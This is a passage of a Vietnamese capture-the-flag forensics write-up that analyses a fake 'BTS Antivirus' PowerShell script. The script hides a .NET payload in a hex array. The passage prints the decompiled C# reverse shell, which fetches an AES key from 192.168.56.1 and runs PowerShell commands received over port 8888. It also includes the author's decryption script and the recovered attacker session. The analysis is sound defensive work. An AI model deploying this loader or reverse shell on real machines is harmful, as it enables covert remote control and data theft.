12,0x41,0x03,0x00,0x00,0x01,0x04,0x00,0x01,0x0e,0x0e,0x0a,0x20,0x04,0x02,0x1c,0x12,0x71,0x12,0x75,0x11,0x79,0x08,0x01,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x1e,0x01,0x00,0x01,0x00,0x54,0x02,0x16,0x57,0x72,0x61,0x70,0x4e,0x6f,0x6e,0x45,0x78,0x63,0x65,0x70,0x74,0x69,0x6f,0x6e,0x54,0x68,0x72,0x6f,0x77,0x73,0x01,0x08,0x01,0x00,0x07,0x01,0x00,0x00,0x00,0x00,0x3d,0x01,0x00,0x18,0x2e,0x4e,0x45,0x54,0x43,0x6f,0x72,0x65,0x41,0x70,0x70,0x2c,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x3d,0x76,0x38,0x2e,0x30,0x01,0x00,0x54,0x0e,0x14,0x46,0x72,0x61,0x6d,0x65,0x77,0x6f,0x72,0x6b,0x44,0x69,0x73,0x70,0x6c,0x61,0x79,0x4e,0x61,0x6d,0x65,0x08,0x2e,0x4e,0x45,0x54,0x20,0x38,0x2e,0x30,0x0d,0x01,0x00,0x08,0x45,0x78,0x65,0x63,0x75,0x74,0x6f,0x72,0x00,0x00,0x0a,0x01,0x00,0x05,0x44,0x65,0x62,0x75,0x67,0x00,0x00,0x0c,0x01,0x00,0x07,0x31,0x2e,0x30,0x2e,0x30,0x2e,0x30,0x00,0x00,0x33,0x01,0x00,0x2e,0x31,0x2e,0x30,0x2e,0x30,0x2b,0x62,0x33,0x33,0x36,0x37,0x63,0x37,0x37,0x64,0x61,0x64,0x62,0x35,0x32,0x38,0x39,0x62,0x65,0x62,0x30,0x37,0x63,0x61,0x63,0x35,0x32,0x37,0x33,0x38,0x35,0x30,0x34,0x61,0x30,0x66,0x35,0x63,0x30,0x33,0x39,0x00,0x00,0x05,0x01,0x00,0x02,0x00,0x00,0x05,0x01,0x00,0x00,0x00,0x00,0x05,0x01,0x00,0x01,0x00,0x00,0x04,0x01,0x00,0x00,0x00,0x08,0x01,0x00,0x0b,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xed,0x46,0xf1,0xf4,0x00,0x01,0x4d,0x50,0x02,0x00,0x00,0x00,0x61,0x00,0x00,0x00,0x40,0x33,0x00,0x00,0x40,0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x13,0x00,0x00,0x00,0x27,0x00,0x00,0x00,0xa1,0x33,0x00,0x00,0xa1,0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x52,0x53,0x44,0x53,0x16,0x64,0xfc,0x88,0x46,0xd1,0x0f,0x4c,0x88,0x16,0x2a,0x62,0x5d,0x28,0x9c,0x20,0x01,0x00,0x00,0x00,0x43,0x3a,0x5c,0x55,0x73,0x65,0x72,0x73,0x5c,0x4d,0x69,0x63,0x68,0x61,0x42,0x5c,0x77,0x68,0x2d,0x62,0x74,0x73,0x5c,0x66,0x6f,0x72,0x65,0x6e,0x73,0x69,0x63,0x73,0x32,0x5c,0x45,0x78,0x65,0x63,0x75,0x74,0x6f,0x72,0x5c,0x6f,0x62,0x6a,0x5c,0x44,0x65,0x62,0x75,0x67,0x5c,0x6e,0x65,0x74,0x38,0x2e,0x30,0x5c,0x45,0x78,0x65,0x63,0x75,0x74,0x6f,0x72,0x2e,0x70,0x64,0x62,0x00,0x53,0x48,0x41,0x32,0x35,0x36,0x00,0x16,0x64,0xfc,0x88,0x46,0xd1,0x0f,0x4c,0x48,0x16,0x2a,0x62,0x5d,0x28,0x9c,0x20,0xed,0x46,0xf1,0xf4,0x83,0x26,0xff,0xdc,0x33,0xbb,0x1f,0xf1,0x9d,0xfb,0xf3,0xcd,0xf0,0x33,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0a,0x34,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xfc,0x33,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x5f,0x43,0x6f,0x72,0x44,0x6c,0x6c,0x4d,0x61,0x69,0x6e,0x00,0x6d,0x73,0x63,0x6f,0x72,0x65,0x65,0x2e,0x64,0x6c,0x6c,0x00,0x00,0x00,0x00,0x00,0xff,0x25,0x00,0x20,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x10,0x00,0x00,0x00,0x18,0x00,0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x30,0x00,0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x58,0x40,0x00,0x00,0x14,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x03,0x34,0x00,0x00,0x00,0x56,0x00,0x53,0x00,0x5f,0x00,0x56,0x00,0x45,0x00,0x52,0x00,0x53,0x00,0x49,0x00,0x4f,0x00,0x4e,0x00,0x5f,0x00,0x49,0x00,0x4e,0x00,0x46,0x00,0x4f,0x00,0x00,0x00,0x00,0x00,0xbd,0x04,0xef,0xfe,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x00,0x01,0x00,0x56,0x00,0x61,0x00,0x72,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x49,0x00,0x6e,0x00,0x66,0x00,0x6f,0x00,0x00,0x00,0x00,0x00,0x24,0x00,0x04,0x00,0x00,0x00,0x54,0x00,0x72,0x00,0x61,0x00,0x6e,0x00,0x73,0x00,0x6c,0x00,0x61,0x00,0x74,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x04,0x74,0x02,0x00,0x00,0x01,0x00,0x53,0x00,0x74,0x00,0x72,0x00,0x69,0x00,0x6e,0x00,0x67,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x49,0x00,0x6e,0x00,0x66,0x00,0x6f,0x00,0x00,0x00,0x50,0x02,0x00,0x00,0x01,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x34,0x00,0x62,0x00,0x30,0x00,0x00,0x00,0x32,0x00,0x09,0x00,0x01,0x00,0x43,0x00,0x6f,0x00,0x6d,0x00,0x70,0x00,0x61,0x00,0x6e,0x00,0x79,0x00,0x4e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x00,0x00,0x00,0x00,0x45,0x00,0x78,0x00,0x65,0x00,0x63,0x00,0x75,0x00,0x74,0x00,0x6f,0x00,0x72,0x00,0x00,0x00,0x00,0x00,0x3a,0x00,0x09,0x00,0x01,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x44,0x00,0x65,0x00,0x73,0x00,0x63,0x00,0x72,0x00,0x69,0x00,0x70,0x00,0x74,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x45,0x00,0x78,0x00,0x65,0x00,0x63,0x00,0x75,0x00,0x74,0x00,0x6f,0x00,0x72,0x00,0x00,0x00,0x00,0x00,0x30,0x00,0x08,0x00,0x01,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x31,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x00,0x00,0x3a,0x00,0x0d,0x00,0x01,0x00,0x49,0x00,0x6e,0x00,0x74,0x00,0x65,0x00,0x72,0x00,0x6e,0x00,0x61,0x00,0x6c,0x00,0x4e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x00,0x00,0x45,0x00,0x78,0x00,0x65,0x00,0x63,0x00,0x75,0x00,0x74,0x00,0x6f,0x00,0x72,0x00,0x2e,0x00,0x64,0x00,0x6c,0x00,0x6c,0x00,0x00,0x00,0x00,0x00,0x28,0x00,0x02,0x00,0x01,0x00,0x4c,0x00,0x65,0x00,0x67,0x00,0x61,0x00,0x6c,0x00,0x43,0x00,0x6f,0x00,0x70,0x00,0x79,0x00,0x72,0x00,0x69,0x00,0x67,0x00,0x68,0x00,0x74,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x42,0x00,0x0d,0x00,0x01,0x00,0x4f,0x00,0x72,0x00,0x69,0x00,0x67,0x00,0x69,0x00,0x6e,0x00,0x61,0x00,0x6c,0x00,0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x00,0x00,0x45,0x00,0x78,0x00,0x65,0x00,0x63,0x00,0x75,0x00,0x74,0x00,0x6f,0x00,0x72,0x00,0x2e,0x00,0x64,0x00,0x6c,0x00,0x6c,0x00,0x00,0x00,0x00,0x00,0x32,0x00,0x09,0x00,0x01,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x64,0x00,0x75,0x00,0x63,0x00,0x74,0x00,0x4e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x00,0x00,0x00,0x00,0x45,0x00,0x78,0x00,0x65,0x00,0x63,0x00,0x75,0x00,0x74,0x00,0x6f,0x00,0x72,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x2f,0x00,0x01,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x64,0x00,0x75,0x00,0x63,0x00,0x74,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x31,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2b,0x00,0x62,0x00,0x33,0x00,0x33,0x00,0x36,0x00,0x37,0x00,0x63,0x00,0x37,0x00,0x37,0x00,0x64,0x00,0x61,0x00,0x64,0x00,0x62,0x00,0x35,0x00,0x32,0x00,0x38,0x00,0x39,0x00,0x62,0x00,0x65,0x00,0x62,0x00,0x30,0x00,0x37,0x00,0x63,0x00,0x61,0x00,0x63,0x00,0x35,0x00,0x32,0x00,0x37,0x00,0x33,0x00,0x38,0x00,0x35,0x00,0x30,0x00,0x34,0x00,0x61,0x00,0x30,0x00,0x66,0x00,0x35,0x00,0x63,0x00,0x30,0x00,0x33,0x00,0x39,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x08,0x00,0x01,0x00,0x41,0x00,0x73,0x00,0x73,0x00,0x65,0x00,0x6d,0x00,0x62,0x00,0x6c,0x00,0x79,0x00,0x20,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00,0x00,0x00,0x31,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x2e,0x00,0x30,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x0c,0x00,0x00,0x00,0x1c,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00; $assembly = [System.Reflection.Assembly]::Load($data); $type = $assembly.GetType(\u0026#34;Executor\u0026#34;); $method = $type.GetMethod(\u0026#34;Run\u0026#34;); $method.Invoke($null, $null); }; Write-Host \u0026#34;Welcome to the BTS Antivirus!!!\u0026#34;; Write-Host \u0026#34;Starting full system scan...\u0026#34;; Start-Job -ScriptBlock $sb | Out-Null; Start-Sleep 10 Write-Host \u0026#34;Scan complete - no viruses found :D\u0026#34; Mình không hiểu gì lắm về đoạn mã này. Thử copy nguyên đoạn mã hex, decode nó thì mình có được 1 file .exe. Virustotal không báo bất kì vendor nào.Mình dùng DIE thì thấy nó là code C#. Mình decompiler nó bằng JetBrain Dotpeek (mình có thử ILSpy nhưng có vẻ nó lỗi 1 số đoạn). Sau đó ta được đoạn mã sau:\nusing System; using System.Collections.Generic; using System.Diagnostics; using System.IO; using System.Linq; using System.Net; using System.Net.Security; using System.Net.Sockets; using System.Security.Cryptography; using System.Text; #nullable enable internal class Executor { private static byte[] Encrypt(string plaintext, ICryptoTransform encryptor) { MemoryStream memoryStream = new MemoryStream(); using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, encryptor, (CryptoStreamMode) 1)) { using (StreamWriter streamWriter = new StreamWriter((Stream) cryptoStream)) ((TextWriter) streamWriter).Write(plaintext); return memoryStream.ToArray(); } } private static string Decrypt(byte[] ciphertext, ICryptoTransform decryptor) { using (CryptoStream cryptoStream = new CryptoStream((Stream) new MemoryStream(ciphertext), decryptor, (CryptoStreamMode) 0)) { using (StreamReader streamReader = new StreamReader((Stream) cryptoStream)) return ((TextReader) streamReader).ReadToEnd(); } } public static void Run() { using (Aes aes = Aes.Create()) { ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback) ((_param1, _param2, _param3, _param4) =\u0026gt; true); ((SymmetricAlgorithm) aes).Key = new WebClient().DownloadData(\u0026#34;https://192.168.56.1:5000/get_key\u0026#34;); ((SymmetricAlgorithm) aes).IV = Encoding.UTF8.GetBytes(\u0026#34;Z6LhFDiCgfOB8HNK\u0026#34;); ((SymmetricAlgorithm) aes).Mode = (CipherMode) 1; ICryptoTransform encryptor = ((SymmetricAlgorithm) aes).CreateEncryptor(((SymmetricAlgorithm) aes).Key, ((SymmetricAlgorithm) aes).IV); ICryptoTransform decryptor = ((SymmetricAlgorithm) aes).CreateDecryptor(((SymmetricAlgorithm) aes).Key, ((SymmetricAlgorithm) aes).IV); using (TcpClient tcpClient = new TcpClient(\u0026#34;192.168.56.1\u0026#34;, 8888)) { using (NetworkStream stream = tcpClient.GetStream()) { byte[] source = new byte[4096]; try { while (true) { int count = ((Stream) stream).Read(source, 0, source.Length); byte[] second = Executor.Encrypt(Executor.ExecuteCommand(Executor.Decrypt(((IEnumerable\u0026lt;byte\u0026gt;) source).Take\u0026lt;byte\u0026gt;(count).ToArray\u0026lt;byte\u0026gt;(), decryptor)), encryptor); byte[] bytes = BitConverter.GetBytes(second.Length); ((Stream) stream).Write(((IEnumerable\u0026lt;byte\u0026gt;) bytes).Concat\u0026lt;byte\u0026gt;((IEnumerable\u0026lt;byte\u0026gt;) second).ToArray\u0026lt;byte\u0026gt;(), 0, second.Length + 4); } } catch (Exception ex) { ((Stream) stream).Write(Encoding.UTF8.GetBytes(ex.Message), 0, ex.Message.Length); } } } } } private static string ExecuteCommand(string command) { Process process = new Process() { StartInfo = new ProcessStartInfo() { FileName = \u0026#34;powershell.exe\u0026#34;, Arguments = \u0026#34;-Command \u0026#34; + command, RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true, RedirectStandardError = true } }; process.Start(); string end = ((TextReader) process.StandardOutput).ReadToEnd(); process.WaitForExit(); return end; } } Nói chung mình cũng vẫn không hiểu lắm. Mình để ý trong hàm Run() có thằng AES. Nó lấy key từ địa chỉ https://192.168.56.1:5000/get_key. Từ đoạn mã ta có IV là Z6LhFDiCgfOB8HNK. Giờ việc còn lại là cần tìm key. Extract file .zip ban đầu, mình được 1 file có đuôi DMP. Dạng này mình đã từng gặp nên đoán là extract key từ file này ra. Thử dùng vol3, dù mình cũng đoán là nó không được kkk. Mình dùng AESkeyfind thay cho bulk-extractor, đơn giản là vì nó dùng riêng cho mục đích đó thì sao không dùng.\n┌──(kali㉿kali)-[~/Downloads/BTSAntivirus] └─$ aeskeyfind -v minidump.DMP FOUND POSSIBLE 128-BIT KEY AT BYTE 247a528 KEY: 74f4906e5493558d1fe749345085523d Giờ đã có key, vấn đề là lấy data từ đâu. Từ đoạn code ta được biết nó sẽ mã hóa dữ liệu gửi qua cổng 8888.\nfrom scapy.all import * from Crypto.Cipher import AES from Crypto.Util import Padding # Khóa AES và IV key = b\u0026#34;\\x74\\xf4\\x90\\x6e\\x54\\x93\\x55\\x8d\\x1f\\xe7\\x49\\x34\\x50\\x85\\x52\\x3d\u0026#34; iv = b\u0026#34;Z6LhFDiCgfOB8HNK\u0026#34; # Danh sách lưu các tin nhắn giải mã messages = [] pcap = rdpcap(\u0026#34;c73942da210e547b5addab8e46dc5ce2.pcapng\u0026#34;) for pkt in pcap: if pkt.haslayer(TCP): cipher = AES.new(key, AES.MODE_CBC, iv) # Xử lý các gói tin từ/đến cổng 8888 if pkt[TCP].dport == 8888: try: # Bỏ qua 4 byte đầu tiên của payload encrypted_data = bytes(pkt[TCP].payload)[4:] decrypted_data = cipher.decrypt(encrypted_data) messages.append(Padding.unpad(decrypted_data, AES.block_size)) except Exception as e: pass elif pkt[TCP].sport == 8888: try: # Giải mã toàn bộ payload encrypted_data = bytes(pkt[TCP].payload) decrypted_data = cipher.decrypt(encrypted_data) messages.append(Padding.unpad(decrypted_data, AES.block_size)) except Exception as e: pass for message in messages: try: print(message.decode()) except UnicodeDecodeError: print(\u0026#34;Không thể decode tin nhắn này.\u0026#34;) Ta có được đầu ra:\nwhoami bob-pc\\bob pwd Path ---- C:\\Users\\bob gci Env: Name Value ---- ----- ALLUSERSPROFILE C:\\ProgramData APPDATA C:\\Users\\bob\\AppData\\Roaming CommonProgramFiles C:\\Program Files\\Common Files CommonProgramFiles(x86) C:\\Program Files (x86)\\Common Files CommonProgramW6432 C:\\Program Files\\Common Files COMPUTERNAME BOB-PC ComSpec C:\\Windows\\system32\\cmd.exe DriverData C:\\Windows\\System32\\Drivers\\DriverData flag_part BtSCTF{Sti11 HOMEDRIVE C: HOMEPATH \\Users\\bob LOCALAPPDATA C:\\Users\\bob\\AppData\\Local LOGONSERVER \\\\BOB-PC NUMBER_OF_PROCESSORS 4 OneDrive C:\\Users\\bob\\OneDrive OS Windows_NT Path C:\\Program Files\\PowerShell\\7;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem... PATHEXT .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL POWERSHELL_DISTRIBUTION_CHA... MSI:Windows 10 Pro POWERSHELL_TELEMETRY_OPTOUT 1 PROCESSOR_ARCHITECTURE AMD64 PROCESSOR_IDENTIFIER AMD64 Family 23 Model 113 Stepping 0, AuthenticAMD PROCESSOR_LEVEL 23 PROCESSOR_REVISION 7100 ProgramData C:\\ProgramData ProgramFiles C:\\Program Files ProgramFiles(x86) C:\\Program Files (x86) ProgramW6432 C:\\Program Files PSModulePath C:\\Users\\bob\\Documents\\PowerShell\\Modules;C:\\Program Files\\PowerShell\\Modules;c:\\prog... PUBLIC C:\\Users\\Public SESSIONNAME Console SystemDrive C: SystemRoot C:\\Windows TEMP C:\\Users\\bob\\AppData\\Local\\Temp TMP C:\\Users\\bob\\AppData\\Local\\Temp USERDOMAIN BOB-PC USERDOMAIN_ROAMINGPROFILE BOB-PC USERNAME bob USERPROFILE C:\\Users\\bob windir C:\\Windows WSLENV WT_SESSION:WT_PROFILE_ID: WT_PROFILE_ID {574e775e-4f2a-5b96-ac1e-a2962a402336} WT_SESSION 83c660f8-e0fe-42b5-a2d9-23519f2fa432 gci C:\\Users\\bob Directory: C:\\Users\\bob Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r--- 4/29/2024 2:59 PM Contacts d-r--- 4/30/2024 12:26 PM Desktop d-r--- 4/30/2024 12:26 PM Documents d-r--- 4/29/2024 3:47 PM Downloads d-r--- 4/29/2024 8:54 PM Favorites d-r--- 4/29/2024 8:54 PM Links d-r--- 4/29/2024 2:59 PM Music d-r--- 3/17/2024 1:21 PM OneDrive d-r--- 4/29/2024 2:59 PM Pictures d-r--- 4/29/2024 2:59 PM Saved Games d-r--- 4/29/2024 8:54 PM Searches d-r--- 4/29/2024 2:59 PM Videos gci C:\\Users\\bob\\Documents Directory: C:\\Users\\bob\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/29/2024 3:30 PM 20078 freeflag.docm gci C:\\Users\\bob\\Desktop Directory: C:\\Users\\bob\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 